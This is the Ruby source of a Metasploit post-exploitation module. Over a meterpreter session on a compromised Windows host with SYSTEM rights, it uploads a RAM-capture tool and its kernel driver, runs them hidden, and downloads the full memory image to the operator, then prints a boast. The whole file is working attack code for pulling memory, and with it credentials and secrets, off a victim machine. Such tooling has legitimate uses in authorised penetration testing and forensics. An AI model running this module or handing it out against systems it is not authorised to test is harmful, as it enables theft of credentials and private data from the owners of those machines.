##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# This Module has an embred Belkasoft RAM Capturer version of 2018-08
# Available at https://belkasoft.com/ram-capturer
##

#
# Forensic memory dump using Belkasoft RAM Capturer
#
# Helvio Junior (M4v3r1cK) m4v3r1ck.hjr [at] gmail.com
#    https://www.helviojunior.com.br
#
# Other modules repository: https://github.com/helviojunior/metasploit_modules
#
# Standard Library
#
require 'tmpdir'


class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Memory Dump Imaging',
      'Description'   => %q{This module will perform a memory dump of remote machine},
      'License'       => MSF_LICENSE,
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Author'        => ['Helvio Junior (M4v3r1cK) <m4v3r1ck.hjr[at]gmail.com>']
    ))
    register_options(
      [
        OptString.new('RAMCAPTURE_PATH',[true,'Path of Belkasoft RAM Capturer',''])
      ])
  end

  def run
    vprint_status("Determining session platform, type and privileges")
    case session.platform
    when 'windows'
      if session.type != "meterpreter"
        print_error "Only meterpreter sessions are supported on Windows hosts"
        return
      end
      @platform = :windows
    else
      print_error("Unsupported platform: #{session.platform}")
      return
    end

    unless got_root
        print_error("You need SYSTEM privileges for use this script")
        return
    end

    #Get Windows environment variables
    return unless get_env_vars
    
    print_status("Executing Dump of #{@win_env_vars['arch']} architherure host")

    send_and_execute

    print_good("0wn3d by M4v3r1cK!")
  end

  def get_env_vars
    @win_env_vars = {}
    
    env_vars = session.sys.config.getenvs('TEMP', 'SystemDrive', 'PROCESSOR_ARCHITECTURE', 'PROCESSOR_ARCHITEW6432')

    @win_env_vars['temp'] = env_vars['TEMP'] + "\\"
    @win_env_vars['system_drive'] = env_vars['SystemDrive']
    @win_env_vars['arch'] = 'x86'

    if env_vars['PROCESSOR_ARCHITECTURE'].nil? or env_vars['PROCESSOR_ARCHITECTURE'].empty?
        print_error("Was not possible to determine Windows Architherure (x86 oe x64)")
        return
    end

    if env_vars['PROCESSOR_ARCHITECTURE'] =~ /amd64/i
        @win_env_vars['arch'] = 'x64'
    end

    if env_vars['PROCESSOR_ARCHITEW6432'] =~ /amd64/i
        @win_env_vars['arch'] = 'x64'
    end

    true
  end

  def send_and_execute
    

    new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".vmem"
    tmp = Dir::tmpdir + "/" + new_file
    mem_dump = @win_env_vars['temp'] + new_file

    cmd = ""
    prog2check = ""

    print_warning("Sending file, this may take some time...")
    files = Array[]

    if @win_env_vars['arch'] == "x64"

        files.push('msvcp110.dll')
        files.push('msvcr110.dll')
        files.push('RamCapture64.exe')
        files.push('ramcapturedriver.cat')
        files.push('RamCaptureDriver64.sys')

        prog2check = 'RamCapture64.exe'
        mem_dump = @win_env_vars['temp'] + new_file

        ramcapture_path = datastore['RAMCAPTURE_PATH']

        files.each do |f|
            file = File.join(ramcapture_path, 'x64/' + f)

            if !File.exist?(file) or !File.file?(file)
                print_error("File not found: #{file}")
                return
            end

        end


        files.each do |f|
            file = File.join(ramcapture_path, 'x64/' + f)

            print_status("Uploading file #{@win_env_vars['temp']}#{f}")
            session.fs.file.upload_file(@win_env_vars['temp'] + f, file)  

        end


    else


        files.push('msvcp110.dll')
        files.push('msvcr110.dll')
        files.push('RamCapture.exe')
        files.push('RamCaptureDriver.sys')

        prog2check = 'RamCapture.exe'

        ramcapture_path = datastore['RAMCAPTURE_PATH']

        files.each do |f|
            file = File.join(ramcapture_path, 'x86/' + f)

            if !File.exist?(file) or !File.file?(file)
                print_error("File not found: #{file}")
                return
            end

        end


        files.each do |f|
            file = File.join(ramcapture_path, 'x86/' + f)

            print_status("Uploading file #{@win_env_vars['temp']}#{f}")
            session.fs.file.upload_file(@win_env_vars['temp'] + f, file)  

        end


    end

    print_status("Running #{prog2check}")
    print_warning("This may take some time...")
    r = session.sys.process.execute( @win_env_vars['temp'] + prog2check, mem_dump,{'Hidden' => true})
    sleep(2)

    #check if is running
    found = 0
    while found == 0
            session.sys.process.get_processes().each do |x|
                    found =1
                    if prog2check.downcase == (x['name'].downcase)
                            sleep(0.5)
                            found = 0
                    end
            end
    end
    r.close

    if !session.fs.file.exist?(mem_dump)
        print_error("Remote memory dump file #{mem_dump} not found!")
        return false
    else
        print_error("Remote memory dump file saved at #{mem_dump}")  
    end

    
    print_status("Downloading memory dump to #{tmp}")
    session.fs.file.download_file(tmp, mem_dump)

    print_status("Downloading fineshed")


    true
  end

  def got_root
    case @platform
    when :windows
      session.sys.config.getuid =~ /SYSTEM/ ? true : false
    else
      false
    end
  end

  def whoami
    if @platform == :windows
      id = session.sys.config.getenv('USERNAME')
    else
      id = cmd_exec("id -un")
    end

    id
  end
    

end
